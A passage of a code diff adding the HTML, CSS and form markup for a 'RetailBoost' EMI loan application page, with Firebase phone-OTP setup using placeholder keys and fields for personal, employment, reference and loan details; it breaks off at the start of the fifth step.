@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RetailBoost | Loan Application</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<!-- ══════════════════════════════════════════════════
+     FIREBASE SDK  — loaded from CDN (no backend needed)
+     ══════════════════════════════════════════════════ -->
+<script type="module">
+  import { initializeApp }            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getAuth, RecaptchaVerifier, signInWithPhoneNumber }
+                                      from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+  /* ─────────────────────────────────────────────────
+     🔧 STEP 1 — Paste your Firebase project config here
+     Go to: console.firebase.google.com → Project Settings → Your apps → SDK setup
+  ───────────────────────────────────────────────── */
+  const firebaseConfig = {
+    apiKey:            "YOUR_API_KEY",
+    authDomain:        "YOUR_PROJECT_ID.firebaseapp.com",
+    projectId:         "YOUR_PROJECT_ID",
+    storageBucket:     "YOUR_PROJECT_ID.appspot.com",
+    messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+    appId:             "YOUR_APP_ID"
+  };
+
+  const app  = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  auth.languageCode = 'en';
+
+  // expose to global scope so regular scripts can call them
+  window._firebaseAuth = auth;
+  window._RecaptchaVerifier     = RecaptchaVerifier;
+  window._signInWithPhoneNumber = signInWithPhoneNumber;
+</script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif;}
+:root{--navy:#0b3d91;--green:#2ecc71;--light:#f6f9ff;--border:#dde6f7;--text:#222;--muted:#666;--red:#e74c3c;}
+body{background:var(--light);color:var(--text);}
+
+.navbar{position:fixed;top:0;width:100%;background:rgba(11,61,145,.95);padding:15px 0;z-index:9999;backdrop-filter:blur(8px);}
+.nav-flex{display:flex;justify-content:space-between;align-items:center;max-width:1200px;margin:auto;padding:0 20px;}
+.logo{color:#2ecc71;font-size:1.4rem;font-weight:700;text-decoration:none;}
+nav a{color:white;margin-left:25px;text-decoration:none;font-size:.9rem;opacity:.85;transition:.2s;}
+nav a:hover{opacity:1;}
+
+.loan-hero{margin-top:70px;background:linear-gradient(135deg,#0b3d91,#0a5294,#1a7a3a);padding:55px 20px 35px;text-align:center;color:white;position:relative;overflow:hidden;}
+.loan-hero h1{font-size:2.2rem;font-weight:700;margin-bottom:8px;position:relative;}
+.loan-hero p{font-size:.95rem;opacity:.85;max-width:500px;margin:0 auto;position:relative;}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(46,204,113,.2);border:1px solid rgba(46,204,113,.4);color:#2ecc71;padding:6px 16px;border-radius:20px;font-size:.8rem;font-weight:600;margin-bottom:16px;position:relative;}
+
+.stepper-wrap{background:white;box-shadow:0 2px 20px rgba(11,61,145,.1);padding:22px 20px;position:sticky;top:70px;z-index:100;}
+.stepper{display:flex;align-items:center;justify-content:center;max-width:700px;margin:0 auto;}
+.step{display:flex;flex-direction:column;align-items:center;flex:1;position:relative;}
+.step:not(:last-child)::after{content:'';position:absolute;top:18px;left:50%;width:100%;height:2px;background:var(--border);z-index:0;transition:.4s;}
+.step.done:not(:last-child)::after{background:var(--green);}
+.step-circle{width:36px;height:36px;border-radius:50%;background:var(--border);color:#999;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.85rem;position:relative;z-index:1;transition:.3s;}
+.step.active .step-circle{background:var(--navy);color:white;box-shadow:0 0 0 4px rgba(11,61,145,.2);}
+.step.done .step-circle{background:var(--green);color:white;}
+.step-label{font-size:.65rem;font-weight:600;color:#999;margin-top:6px;text-align:center;transition:.3s;}
+.step.active .step-label{color:var(--navy);}
+.step.done .step-label{color:var(--green);}
+
+.form-wrap{max-width:760px;margin:36px auto;padding:0 20px 60px;}
+.form-page{display:none;}
+.form-page.active{display:block;animation:fadeIn .4s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(16px);}to{opacity:1;transform:none;}}
+.form-card{background:white;border-radius:18px;box-shadow:0 10px 40px rgba(11,61,145,.1);overflow:hidden;}
+.form-card-header{background:linear-gradient(135deg,var(--navy),#1565c0);padding:22px 30px;color:white;}
+.form-card-header h2{font-size:1.2rem;font-weight:700;}
+.form-card-header p{font-size:.82rem;opacity:.8;margin-top:4px;}
+.page-icon{font-size:1.8rem;margin-bottom:6px;}
+.form-body{padding:28px 30px;}
+
+.field-group{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px;}
+.field-group.single{grid-template-columns:1fr;}
+.field-group.triple{grid-template-columns:1fr 1fr 1fr;}
+.field{display:flex;flex-direction:column;gap:5px;}
+.field label{font-size:.8rem;font-weight:600;color:var(--navy);}
+.req{color:var(--red);margin-left:2px;}
+.opt-tag{font-size:.7rem;font-weight:400;color:var(--muted);margin-left:4px;background:#eef3ff;padding:1px 6px;border-radius:6px;}
+.field input,.field select{width:100%;padding:11px 14px;border:1.5px solid var(--border);border-radius:10px;font-size:.88rem;font-family:Poppins,sans-serif;color:var(--text);background:white;transition:.2s;outline:none;}
+.field input:focus,.field select:focus{border-color:var(--navy);box-shadow:0 0 0 3px rgba(11,61,145,.1);}
+.field input.error,.field select.error{border-color:var(--red)!important;box-shadow:0 0 0 3px rgba(231,76,60,.1);}
+.err-msg{font-size:.72rem;color:var(--red);display:none;}
+.err-msg.show{display:block;}
+
+/* OTP styles */
+.phone-row{display:flex;gap:10px;align-items:flex-start;}
+.phone-row input{flex:1;}
+.btn-send-otp{background:var(--navy);color:white;border:none;border-radius:10px;padding:11px 16px;font-size:.8rem;font-weight:600;cursor:pointer;white-space:nowrap;font-family:Poppins,sans-serif;transition:.2s;flex-shrink:0;}
+.btn-send-otp:disabled{background:#aaa;cursor:not-allowed;}
+.otp-wrap{display:none;margin-top:10px;}
+.otp-wrap.show{display:block;}
+.otp-input-row{display:flex;gap:10px;align-items:center;margin-top:6px;}
+.otp-input-row input{flex:1;text-align:center;letter-spacing:4px;font-size:1.1rem;font-weight:700;}
+.btn-verify-otp{background:var(--green);color:white;border:none;border-radius:10px;padding:11px 16px;font-size:.8rem;font-weight:600;cursor:pointer;font-family:Poppins,sans-serif;}
+.otp-verified{display:none;align-items:center;gap:6px;color:#27ae60;font-size:.82rem;font-weight:600;margin-top:8px;}
+.otp-verified.show{display:flex;}
+.otp-timer{font-size:.75rem;color:var(--muted);margin-top:4px;}
+.resend-link{font-size:.75rem;color:var(--navy);cursor:pointer;text-decoration:underline;display:none;}
+.resend-link.show{display:inline;}
+
+/* recaptcha container - hidden visually but Firebase needs it in DOM */
+#recaptcha-container{margin-top:8px;}
+
+.upload-box{border:2px dashed var(--border);border-radius:10px;padding:20px;text-align:center;cursor:pointer;transition:.2s;position:relative;overflow:hidden;}
+.upload-box:hover{border-color:var(--navy);background:#f0f5ff;}
+.upload-box.has-file{border-style:solid;border-color:var(--green);background:#f0fff5;}
+.upload-box.error{border-color:var(--red)!important;background:#fff8f8;}
+.upload-box input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;}
+.upload-box .uicon{font-size:1.8rem;margin-bottom:6px;}
+.upload-box strong{display:block;font-size:.82rem;color:var(--navy);}
+.upload-box p{font-size:.75rem;color:var(--muted);}
+
+.radio-group{display:flex;flex-wrap:wrap;gap:8px;margin-top:4px;}
+.radio-opt input{display:none;}
+.radio-opt label{display:inline-block;padding:8px 16px;border:1.5px solid var(--border);border-radius:8px;font-size:.82rem;cursor:pointer;transition:.2s;color:var(--muted);font-weight:500;}
+.radio-opt input:checked+label{border-color:var(--navy);background:var(--navy);color:white;}
+.radio-group.error .radio-opt label{border-color:#f5c6cb;}
+
+.checkbox-row{display:flex;align-items:flex-start;gap:12px;background:#f0f5ff;border-radius:12px;padding:16px;border:1.5px solid var(--border);transition:.2s;}
+.checkbox-row.error{border-color:var(--red);background:#fff5f5;}
+.checkbox-row input[type=checkbox]{width:18px;height:18px;margin-top:2px;flex-shrink:0;accent-color:var(--navy);cursor:pointer;}
+.checkbox-row label{font-size:.82rem;color:var(--text);line-height:1.5;cursor:pointer;}
+.hint{font-size:.75rem;color:var(--muted);margin-top:4px;}
+.section-divider{font-size:.82rem;font-weight:700;color:var(--navy);margin:22px 0 14px;padding-bottom:8px;border-bottom:2px solid var(--border);}
+
+.form-nav{display:flex;justify-content:space-between;align-items:center;padding:18px 30px 26px;border-top:1px solid var(--border);}
+.page-indicator{font-size:.8rem;color:var(--muted);font-weight:600;}
+.btn-back{background:none;border:1.5px solid var(--border);color:var(--muted);padding:11px 24px;border-radius:30px;font-size:.88rem;font-weight:600;cursor:pointer;transition:.2s;font-family:Poppins,sans-serif;}
+.btn-back:hover{border-color:var(--navy);color:var(--navy);}
+.btn-next{background:linear-gradient(135deg,var(--navy),#1565c0);color:white;border:none;padding:12px 30px;border-radius:30px;font-size:.9rem;font-weight:600;cursor:pointer;font-family:Poppins,sans-serif;box-shadow:0 6px 18px rgba(11,61,145,.3);transition:.3s;}
+.btn-next:hover{transform:translateY(-2px);}
+.btn-submit{background:linear-gradient(135deg,var(--green),#27ae60);color:white;border:none;padding:12px 30px;border-radius:30px;font-size:.9rem;font-weight:600;cursor:pointer;font-family:Poppins,sans-serif;box-shadow:0 6px 18px rgba(46,204,113,.35);transition:.3s;}
+.btn-submit:hover{transform:translateY(-2px);}
+
+/* PROCESSING OVERLAY */
+#processingOverlay{display:none;position:fixed;inset:0;background:linear-gradient(135deg,#0b3d91,#081f4f);z-index:99999;align-items:center;justify-content:center;flex-direction:column;color:white;text-align:center;padding:30px;}
+#processingOverlay.show{display:flex;}
+.proc-logo{font-size:2rem;font-weight:700;color:#2ecc71;margin-bottom:8px;}
+.proc-logo-dot{animation:blink 1.2s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.2;}}
+.proc-title{font-size:1.3rem;font-weight:700;margin-bottom:6px;}
+.proc-sub{font-size:.84rem;opacity:.7;margin-bottom:26px;max-width:360px;line-height:1.6;}
+.proc-ring{width:70px;height:70px;border-radius:50%;border:5px solid rgba(255,255,255,.15);border-top-color:#2ecc71;animation:spin 1s linear infinite;margin:0 auto 26px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.proc-steps{display:flex;flex-direction:column;gap:10px;margin-bottom:26px;max-width:360px;width:100%;}
+.proc-step{display:flex;align-items:center;gap:12px;background:rgba(255,255,255,.06);border-radius:12px;padding:12px 16px;font-size:.83rem;font-weight:500;opacity:.3;transition:opacity .5s,background .5s,border .5s;border:1px solid transparent;text-align:left;}
+.proc-step.active{opacity:1;background:rgba(46,204,113,.18);border-color:rgba(46,204,113,.4);}
+.proc-step.done{opacity:1;background:rgba(46,204,113,.1);border-color:rgba(46,204,113,.2);}
+.proc-icon{font-size:1.1rem;flex-shrink:0;}
+.proc-step-text{flex:1;}
+.proc-step-sub{font-size:.71rem;opacity:.65;margin-top:2px;}
+.proc-check{margin-left:auto;opacity:0;transition:.3s;}
+.proc-step.done .proc-check{opacity:1;}
+.proc-bar-wrap{width:100%;max-width:360px;background:rgba(255,255,255,.15);border-radius:30px;height:8px;overflow:hidden;margin-bottom:8px;}
+.proc-bar{height:100%;background:linear-gradient(90deg,#2ecc71,#27ae60);border-radius:30px;width:0%;transition:width .8s ease;}
+.proc-pct{font-size:1rem;font-weight:700;color:#2ecc71;margin-bottom:4px;}
+.proc-status{font-size:.76rem;opacity:.65;min-height:1.2em;}
+
+/* APPROVAL OVERLAY */
+#approvalOverlay{display:none;position:fixed;inset:0;background:rgba(8,20,50,.97);z-index:99999;align-items:center;justify-content:center;padding:20px;overflow-y:auto;}
+#approvalOverlay.show{display:flex;}
+.approval-card{background:white;border-radius:24px;max-width:470px;width:100%;overflow:hidden;animation:popIn .5s cubic-bezier(.175,.885,.32,1.275);}
+@keyframes popIn{from{transform:scale(.7);opacity:0;}to{transform:scale(1);opacity:1;}}
+.appr-top{background:linear-gradient(135deg,#0b3d91,#1565c0);padding:28px 30px 22px;text-align:center;color:white;position:relative;overflow:hidden;}
+.appr-top::before{content:'';position:absolute;top:-30px;right:-30px;width:110px;height:110px;border-radius:50%;background:rgba(46,204,113,.15);}
+.appr-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(46,204,113,.2);border:1px solid rgba(46,204,113,.5);color:#2ecc71;padding:5px 14px;border-radius:20px;font-size:.72rem;font-weight:700;margin-bottom:14px;position:relative;z-index:1;}
+.appr-top h2{font-size:1.45rem;font-weight:700;margin-bottom:5px;position:relative;z-index:1;}
+.appr-top p{font-size:.8rem;opacity:.8;position:relative;z-index:1;}
+.appr-body{padding:26px 28px;}
+.appr-amt-label{font-size:.72rem;color:var(--muted);font-weight:600;text-align:center;margin-bottom:6px;letter-spacing:.5px;}
+.appr-amt{font-size:3rem;font-weight:700;color:var(--navy);text-align:center;line-height:1;}
+.appr-amt span.sym{font-size:1.5rem;vertical-align:super;}
+.appr-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:18px 0;}
+.appr-box{background:#f6f9ff;border-radius:12px;padding:13px;text-align:center;}
+.appr-box .dl{font-size:.68rem;color:var(--muted);font-weight:600;margin-bottom:3px;}
+.appr-box .dv{font-size:.92rem;font-weight:700;color:var(--navy);}
+.appr-loan-num{background:linear-gradient(135deg,#f0f5ff,#e8f5e9);border:1px solid var(--border);border-radius:12px;padding:14px 18px;text-align:center;margin-bottom:18px;}
+.appr-loan-num .rl{font-size:.7rem;color:var(--muted);font-weight:600;margin-bottom:4px;letter-spacing:.5px;}
+.appr-loan-num .rc{font-size:1.05rem;font-weight:700;color:var(--navy);letter-spacing:1.5px;word-break:break-all;}
+.appr-actions{display:flex;flex-direction:column;gap:9px;}
+.btn-wa{display:flex;align-items:center;justify-content:center;gap:8px;background:#25D366;color:white;padding:13px;border-radius:12px;font-weight:600;font-size:.88rem;cursor:pointer;border:none;width:100%;font-family:Poppins,sans-serif;transition:.2s;}
+.btn-wa:hover{background:#22c55e;}
+.btn-hm{display:flex;align-items:center;justify-content:center;gap:6px;background:#f0f5ff;color:var(--navy);padding:11px;border-radius:12px;text-decoration:none;font-weight:600;font-size:.86rem;border:1.5px solid var(--border);transition:.2s;}
+.btn-hm:hover{background:#e0eaff;}
+
+/* CallMeBot status banner */
+.callmebot-status{display:none;background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:12px 16px;margin-bottom:12px;font-size:.8rem;color:#2e7d32;font-weight:500;}
+.callmebot-status.show{display:flex;align-items:center;gap:8px;}
+
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#1a1a2e;color:white;padding:12px 24px;border-radius:30px;font-size:.84rem;font-weight:500;z-index:999999;transition:.4s;opacity:0;white-space:nowrap;max-width:90vw;text-align:center;}
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1;}
+
+footer{background:#081f4f;color:white;text-align:center;padding:22px;font-size:.82rem;}
+.whatsapp{position:fixed;bottom:25px;right:25px;background:#25D366;padding:16px;border-radius:50%;color:white;text-decoration:none;font-size:24px;box-shadow:0 4px 16px rgba(0,0,0,.2);z-index:998;}
+
+@media(max-width:600px){
+  .field-group,.field-group.triple{grid-template-columns:1fr;}
+  .loan-hero h1{font-size:1.5rem;}
+  .form-body{padding:18px;}
+  .form-nav{padding:14px 18px 20px;}
+  .step-label{display:none;}
+  .appr-body{padding:20px;}
+  .phone-row{flex-direction:column;}
+  .btn-send-otp{width:100%;}
+}
+</style>
+</head>
+<body>
+
+<header class="navbar">
+  <div class="nav-flex">
+    <a href="index.html" class="logo">RetailBoost</a>
+    <nav>
+      <a href="index.html#about">About</a>
+      <a href="index.html#works">How it Works</a>
+      <a href="index.html#benefits">Benefits</a>
+      <a href="index.html#join">Join</a>
+    </nav>
+  </div>
+</header>
+
+<div class="loan-hero">
+  <div class="hero-badge">🏦 Instant EMI Finance</div>
+  <h1>New Loan Application</h1>
+  <p>Complete this 5-step form to apply for RetailBoost EMI financing.</p>
+</div>
+
+<div class="stepper-wrap">
+  <div class="stepper">
+    <div class="step active" id="st1"><div class="step-circle">1</div><div class="step-label">Personal</div></div>
+    <div class="step" id="st2"><div class="step-circle">2</div><div class="step-label">Employment</div></div>
+    <div class="step" id="st3"><div class="step-circle">3</div><div class="step-label">References</div></div>
+    <div class="step" id="st4"><div class="step-circle">4</div><div class="step-label">Loan Details</div></div>
+    <div class="step" id="st5"><div class="step-circle">5</div><div class="step-label">Store Info</div></div>
+  </div>
+</div>
+
+<div class="form-wrap">
+
+  <!-- PAGE 1 -->
+  <div class="form-page active" id="page1">
+    <div class="form-card">
+      <div class="form-card-header">
+        <div class="page-icon">👤</div>
+        <h2>Personal Information</h2>
+        <p>All fields marked <span style="color:#f9c74f;">*</span> are mandatory</p>
+      </div>
+      <div class="form-body">
+        <div class="field-group">
+          <div class="field">
+            <label>First Name <span class="req">*</span></label>
+            <input type="text" id="firstName" placeholder="e.g. Rahul" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-firstName">Enter a valid first name (letters only)</span>
+          </div>
+          <div class="field">
+            <label>Last Name <span class="req">*</span></label>
+            <input type="text" id="lastName" placeholder="e.g. Sharma" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-lastName">Enter a valid last name (letters only)</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>Date of Birth <span class="req">*</span></label>
+            <input type="date" id="dob">
+            <span class="err-msg" id="err-dob">Date of birth is required</span>
+          </div>
+          <div class="field">
+            <label>Phone Number <span class="req">*</span></label>
+            <div class="phone-row">
+              <input type="tel" id="phone" placeholder="10-digit mobile number" maxlength="10"
+                     oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
+              <button class="btn-send-otp" id="btnSendOtp" onclick="sendOTP()">Send OTP</button>
+            </div>
+            <!-- Firebase invisible reCAPTCHA mounts here -->
+            <div id="recaptcha-container"></div>
+            <div class="otp-wrap" id="otpWrap">
+              <div class="otp-input-row">
+                <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6"
+                       oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)">
+                <button class="btn-verify-otp" onclick="verifyOTP()">Verify</button>
+              </div>
+              <div class="otp-timer" id="otpTimer">Resend in <span id="otpCountdown">60</span>s</div>
+              <span class="resend-link" id="resendLink" onclick="resendOTP()">Resend OTP</span>
+            </div>
+            <div class="otp-verified" id="otpVerifiedMsg">✅ Mobile number verified!</div>
+            <span class="err-msg" id="err-phone">Enter a valid 10-digit mobile number</span>
+            <span class="err-msg" id="err-otp">Please verify your mobile number with OTP</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>Email Address <span class="req">*</span></label>
+            <input type="email" id="email" placeholder="e.g. rahul@gmail.com">
+            <span class="err-msg" id="err-email">Enter a valid email address</span>
+          </div>
+          <div class="field">
+            <label>Name as per Aadhaar / PAN <span class="req">*</span></label>
+            <input type="text" id="aadharName" placeholder="Full name on ID" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-aadharName">Enter valid name (letters only)</span>
+          </div>
+        </div>
+        <div class="field-group single">
+          <div class="field">
+            <label>Street Address <span class="req">*</span></label>
+            <input type="text" id="addr1" placeholder="Street Address">
+            <span class="err-msg" id="err-addr1">Street address is required</span>
+          </div>
+        </div>
+        <div class="field-group single" style="margin-top:-10px;">
+          <div class="field">
+            <input type="text" id="addr2" placeholder="Address Line 2 (optional)">
+          </div>
+        </div>
+        <div class="field-group triple">
+          <div class="field">
+            <label>City <span class="req">*</span></label>
+            <input type="text" id="city" placeholder="City">
+            <span class="err-msg" id="err-city">City is required</span>
+          </div>
+          <div class="field">
+            <label>State <span class="req">*</span></label>
+            <input type="text" id="state" placeholder="State">
+            <span class="err-msg" id="err-state">State is required</span>
+          </div>
+          <div class="field">
+            <label>PIN Code <span class="req">*</span></label>
+            <input type="text" id="pin" placeholder="560001" maxlength="6"
+                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)">
+            <span class="err-msg" id="err-pin">6-digit PIN required</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>📄 PAN Card <span class="req">*</span></label>
+            <div class="upload-box" id="box-panCard">
+              <input type="file" accept="image/*" id="panCard"
+                     onchange="handleUpload(this,'box-panCard','lbl-panCard','err-panCard')">
+              <div class="uicon">🪪</div>
+              <strong id="lbl-panCard">Upload PAN Card</strong>
+              <p>Click to select image</p>
+            </div>
+            <span class="err-msg" id="err-panCard">PAN Card is required</span>
+          </div>
+          <div class="field">
+            <label>📷 Customer Photo <span class="req">*</span></label>
+            <div class="upload-box" id="box-custPhoto">
+              <input type="file" accept="image/*" id="custPhoto"
+                     onchange="handleUpload(this,'box-custPhoto','lbl-custPhoto','err-custPhoto')">
+              <div class="uicon">🤳</div>
+              <strong id="lbl-custPhoto">Upload Photo</strong>
+              <p>Click to select image</p>
+            </div>
+            <span class="err-msg" id="err-custPhoto">Customer photo is required</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>🪪 Aadhaar / Govt ID <span class="req">*</span></label>
+            <div class="upload-box" id="box-aadhar">
+              <input type="file" accept="image/*" id="aadhar"
+                     onchange="handleUpload(this,'box-aadhar','lbl-aadhar','err-aadhar')">
+              <div class="uicon">📋</div>
+              <strong id="lbl-aadhar">Upload Aadhaar</strong>
+              <p>Click to select image</p>
+            </div>
+            <span class="err-msg" id="err-aadhar">Aadhaar / ID is required</span>
+          </div>
+          <div class="field">
+            <label>&nbsp;</label>
+            <div style="background:#f0f5ff;border-radius:10px;padding:16px;height:100%;display:flex;flex-direction:column;justify-content:center;">
+              <p style="font-size:.76rem;color:var(--muted);line-height:1.8;">📌 Accepted: JPG, PNG<br>📌 Max size: 5MB per file<br>📌 Documents must be clear<br>📌 All uploads are mandatory</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="form-nav">
+        <span class="page-indicator">Step 1 of 5</span>
+        <button class="btn-next" onclick="goNext(1)">Next →</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 2 -->
+  <div class="form-page" id="page2">
+    <div class="form-card">
+      <div class="form-card-header">
+        <div class="page-icon">💼</div>
+        <h2>Employment Information</h2>
+        <p>Customer's current employment and income details</p>
+      </div>
+      <div class="form-body">
+        <div class="field-group">
+          <div class="field">
+            <label>Employer Name <span class="req">*</span></label>
+            <input type="text" id="employer" placeholder="Company or business name">
+            <span class="err-msg" id="err-employer">Employer name is required</span>
+          </div>
+          <div class="field">
+            <label>Work Type <span class="req">*</span></label>
+            <select id="workType">
+              <option value="">Select work type</option>
+              <option>Salaried</option><option>Self-Employed</option>
+              <option>Business Owner</option><option>Freelancer</option><option>Other</option>
+            </select>
+            <span class="err-msg" id="err-workType">Work type is required</span>
+          </div>
+        </div>
+        <div class="field-group single">
+          <div class="field">
+            <label>Length of Employment <span class="req">*</span></label>
+            <div class="radio-group" id="rg-empLen">
+              <div class="radio-opt"><input type="radio" name="empLen" id="el1" value="Below 2 years"><label for="el1">Below 2 years</label></div>
+              <div class="radio-opt"><input type="radio" name="empLen" id="el2" value="2–5 years"><label for="el2">2–5 years</label></div>
+              <div class="radio-opt"><input type="radio" name="empLen" id="el3" value="Above 5 years"><label for="el3">Above 5 years</label></div>
+            </div>
+            <span class="err-msg" id="err-empLen">Please select length of employment</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>Monthly Income (₹) <span class="req">*</span></label>
+            <input type="number" id="income" placeholder="e.g. 25000" min="0">
+            <span class="err-msg" id="err-income">Monthly income is required</span>
+          </div>
+          <div class="field">
+            <label>Other Monthly Income (₹) <span class="opt-tag">optional</span></label>
+            <input type="number" id="otherIncome" placeholder="e.g. 5000" min="0">
+          </div>
+        </div>
+        <div class="field-group single">
+          <div class="field">
+            <label>💰 Salary Slip / Income Proof <span class="opt-tag">optional</span></label>
+            <div class="upload-box" id="box-salarySlip">
+              <input type="file" accept="image/*,.pdf" id="salarySlip"
+                     onchange="handleUpload(this,'box-salarySlip','lbl-salarySlip',null)">
+              <div class="uicon">📊</div>
+              <strong id="lbl-salarySlip">Upload Salary Slip</strong>
+              <p>Salary slip, bank statement, or ITR — not mandatory</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="form-nav">
+        <button class="btn-back" onclick="goPrev(2)">← Back</button>
+        <span class="page-indicator">Step 2 of 5</span>
+        <button class="btn-next" onclick="goNext(2)">Next →</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 3 -->
+  <div class="form-page" id="page3">
+    <div class="form-card">
+      <div class="form-card-header">
+        <div class="page-icon">🤝</div>
+        <h2>References</h2>
+        <p>Provide two personal or professional references</p>
+      </div>
+      <div class="form-body">
+        <p class="section-divider">Reference 1</p>
+        <div class="field-group">
+          <div class="field">
+            <label>First Name <span class="req">*</span></label>
+            <input type="text" id="ref1First" placeholder="First Name" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-ref1First">Required</span>
+          </div>
+          <div class="field">
+            <label>Last Name <span class="req">*</span></label>
+            <input type="text" id="ref1Last" placeholder="Last Name" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-ref1Last">Required</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>Relationship <span class="req">*</span></label>
+            <select id="ref1Rel">
+              <option value="">Select relationship</option>
+              <option>Friend</option><option>Colleague</option><option>Neighbour</option><option>Relative</option><option>Other</option>
+            </select>
+            <span class="err-msg" id="err-ref1Rel">Required</span>
+          </div>
+          <div class="field">
+            <label>Phone Number <span class="req">*</span></label>
+            <input type="tel" id="ref1Phone" placeholder="10-digit mobile number" maxlength="10"
+                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
+            <span class="err-msg" id="err-ref1Phone">Valid 10-digit number required</span>
+          </div>
+        </div>
+        <p class="section-divider">Reference 2</p>
+        <div class="field-group">
+          <div class="field">
+            <label>First Name <span class="req">*</span></label>
+            <input type="text" id="ref2First" placeholder="First Name" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-ref2First">Required</span>
+          </div>
+          <div class="field">
+            <label>Last Name <span class="req">*</span></label>
+            <input type="text" id="ref2Last" placeholder="Last Name" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-ref2Last">Required</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>Relationship <span class="req">*</span></label>
+            <select id="ref2Rel">
+              <option value="">Select relationship</option>
+              <option>Friend</option><option>Colleague</option><option>Neighbour</option><option>Relative</option><option>Other</option>
+            </select>
+            <span class="err-msg" id="err-ref2Rel">Required</span>
+          </div>
+          <div class="field">
+            <label>Phone Number <span class="req">*</span></label>
+            <input type="tel" id="ref2Phone" placeholder="10-digit mobile number" maxlength="10"
+                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
+            <span class="err-msg" id="err-ref2Phone">Valid 10-digit number required</span>
+          </div>
+        </div>
+      </div>
+      <div class="form-nav">
+        <button class="btn-back" onclick="goPrev(3)">← Back</button>
+        <span class="page-indicator">Step 3 of 5</span>
+        <button class="btn-next" onclick="goNext(3)">Next →</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 4 -->
+  <div class="form-page" id="page4">
+    <div class="form-card">
+      <div class="form-card-header">
+        <div class="page-icon">📱</div>
+        <h2>Loan Details</h2>
+        <p>Product and EMI configuration for this application</p>
+      </div>
+      <div class="form-body">
+        <div class="field-group">
+          <div class="field">
+            <label>Product / Device Name <span class="req">*</span></label>
+            <input type="text" id="product" placeholder="e.g. Samsung Galaxy S24">
+            <span class="err-msg" id="err-product">Product name is required</span>
+          </div>
+          <div class="field">
+            <label>Total Product Amount (₹) <span class="req">*</span></label>
+            <input type="number" id="productAmt" placeholder="e.g. 45000" min="0">
+            <span class="err-msg" id="err-productAmt">Product amount is required</span>
+          </div>
+        </div>
+        <div class="field-group">
+          <div class="field">
+            <label>Loan Amount Required (₹) <span class="req">*</span></label>
+            <input type="number" id="loanAmt" placeholder="e.g. 30000" min="0">
+            <span class="err-msg" id="err-loanAmt">Loan amount is required</span>
+          </div>
+          <div class="field">
+            <label>Down Payment Amount (₹) <span class="req">*</span></label>
+            <input type="number" id="downPayment" placeholder="e.g. 15000" min="0">
+            <span class="err-msg" id="err-downPayment">Down payment is required</span>
+          </div>
+        </div>
+        <div class="field-group single">
+          <div class="field">
+            <label>EMI Duration <span class="req">*</span></label>
+            <div class="radio-group" id="rg-emiDur">
+              <div class="radio-opt"><input type="radio" name="emiDur" id="em3" value="3 Months"><label for="em3">3 Months</label></div>
+              <div class="radio-opt"><input type="radio" name="emiDur" id="em6" value="6 Months"><label for="em6">6 Months</label></div>
+              <div class="radio-opt"><input type="radio" name="emiDur" id="em9" value="9 Months"><label for="em9">9 Months</label></div>
+            </div>
+            <span class="err-msg" id="err-emiDur">Please select EMI duration</span>
+          </div>
+        </div>
+        <div class="field-group single">
+          <div class="field">
+            <label>Credit Score <span class="req">*</span></label>
+            <input type="number" id="creditScore" placeholder="e.g. 720" min="300" max="900">
+            <span class="err-msg" id="err-creditScore">Credit score is required (300–900)</span>
+          </div>
+        </div>
+      </div>
+      <div class="form-nav">
+        <button class="btn-back" onclick="goPrev(4)">← Back</button>
+        <span class="page-indicator">Step 4 of 5</span>
+        <button class="btn-next" onclick="goNext(4)">Next →</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 5 -->
+  <div class="form-page" id="page5">
+    <div class="form-card">
+      <div class="form-card-header">
+        <div class="page-icon">🏪</div>
+        <h2>Store Details</h2>
+        <p>Retailer and sales executive information</p>
+      </div>
+      <div class="form-body">
